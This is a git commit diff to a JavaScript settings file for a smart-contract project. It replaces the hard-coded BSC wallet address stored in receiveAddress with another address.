16f0c0295e3a488f30e9d9147226190632f2b87d
greygod59 <72113406+greygod59@users.noreply.github.com>
2023-11-06 14:35:03 -0800

    settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xBAaE1fb2e6b64850530f1F953855badD71db6aF9";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
